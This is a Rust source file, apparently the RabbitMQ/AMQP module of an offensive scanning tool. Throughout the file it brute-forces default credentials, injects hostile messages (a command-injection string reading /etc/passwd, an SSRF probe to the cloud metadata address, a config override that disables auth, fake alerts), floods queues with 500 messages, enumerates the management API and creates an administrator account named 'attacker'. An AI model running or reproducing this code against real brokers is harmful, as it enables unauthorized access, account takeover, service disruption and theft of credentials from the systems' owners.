use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} AMQP/RabbitMQ Unauthorized Access", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("rabbitmq") || body.contains("amqp")) {
        println!(
            "  {} RabbitMQ management interface exposed!",
            "[!]".red().bold()
        );
    }

    let default_creds = [
        ("guest", "guest"),
        ("admin", "admin"),
        ("admin", "password"),
        ("rabbit", "rabbit"),
        ("user", "user"),
    ];

    println!("\n  {} Testing default credentials:", "[*]".cyan().bold());
    for (user, pass) in &default_creds {
        if let Ok(r) = client.get(url).basic_auth(user, Some(pass)).send().await {
            let s = r.status().as_u16();
            if s == 200 {
                println!(
                    "    {} {:15}:{:15} — LOGIN SUCCESS",
                    "[+]".green().bold(),
                    user,
                    pass
                );
            }
        }
    }

    let mgmt_url = format!(
        "{}:15672",
        url.trim_end_matches(':').split(':').next().unwrap_or(url)
    );
    if let Ok(r) = client.get(&mgmt_url).send().await {
        let s = r.status().as_u16();
        if s == 200 {
            println!(
                "\n  {} Management API also accessible on port 15672",
                "[!]".red().bold()
            );
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} AMQP Message Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "Poison queue",
            "amq.direct",
            "poison",
            "MALICIOUS_MESSAGE_INJECTED",
        ),
        (
            "Fake alert",
            "amq.topic",
            "alerts",
            "{\"type\":\"critical\",\"msg\":\"System compromised\"}",
        ),
        (
            "Config override",
            "amq.topic",
            "config",
            "{\"debug\":true,\"auth\":\"disabled\"}",
        ),
        (
            "Command injection",
            "amq.direct",
            "commands",
            "; cat /etc/passwd",
        ),
        (
            "SSRF payload",
            "amq.topic",
            "webhooks",
            "http://169.254.169.254/latest/meta-data/",
        ),
    ];

    for (name, exchange, routing_key, payload) in &payloads {
        let body = serde_json::json!({"action": "amqp_publish", "host": url, "exchange": exchange, "routing_key": routing_key, "message": payload});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = text.contains("published") || text.contains("ok") || status == 200;
                let tag = if success {
                    "PUBLISHED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:20} -> {:15} {}", "*".cyan(), name, exchange, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn flood(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} AMQP Queue Flooding", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut published = 0u32;
    let mut errors = 0u32;

    for i in 0..500u32 {
        let body = serde_json::json!({"action": "amqp_publish", "host": url, "exchange": "amq.direct", "routing_key": "flood", "message": format!("FLOOD_MSG_{}", i)});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    published += 1;
                } else {
                    errors += 1;
                }
            }
            Err(_) => {
                errors += 1;
            }
        }
        if i % 100 == 0 && i > 0 {
            println!(
                "  {} Progress: {} messages published, {} errors",
                "*".cyan(),
                published,
                errors
            );
        }
    }

    println!(
        "\n  {} Results: {} published, {} errors",
        "[*]".cyan().bold(),
        published,
        errors
    );
    if published > 400 {
        println!(
            "  {} Queue flooding successful — server accepted most messages.",
            "[!]".red().bold()
        );
    }

    let queue_body = serde_json::json!({"action": "amqp_queue_declare", "host": url, "queue": "flood_test", "durable": false, "auto_delete": true});
    if let Ok(r) = client.post(url).json(&queue_body).send().await {
        let text = r.text().await.unwrap_or_default();
        if text.contains("declared") {
            println!("  {} Unbounded queue creation allowed.", "[!]".red().bold());
        }
    }

    Ok(())
}

pub async fn mgmt(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} AMQP Management API Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mgmt_endpoints = [
        ("Overview", "/api/overview"),
        ("Nodes", "/api/nodes"),
        ("Users", "/api/users"),
        ("Vhosts", "/api/vhosts"),
        ("Exchanges", "/api/exchanges"),
        ("Queues", "/api/queues"),
        ("Bindings", "/api/bindings"),
        ("Connections", "/api/connections"),
        ("Channels", "/api/channels"),
        ("Definitions", "/api/definitions"),
    ];

    for (name, ep) in &mgmt_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client
            .get(&target)
            .basic_auth("guest", Some("guest"))
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:20} — {} bytes",
                        "[+]".green().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    let create_user = r#"{"password":"attacker123","tags":"administrator"}"#;
    let target = format!("{}/api/users/attacker", url.trim_end_matches('/'));
    if let Ok(r) = client
        .put(&target)
        .header("Content-Type", "application/json")
        .body(create_user)
        .basic_auth("guest", Some("guest"))
        .send()
        .await
    {
        let status = r.status().as_u16();
        if status == 201 || status == 204 {
            println!("\n  {} Created admin user 'attacker'!", "[!]".red().bold());
        }
    }

    Ok(())
}
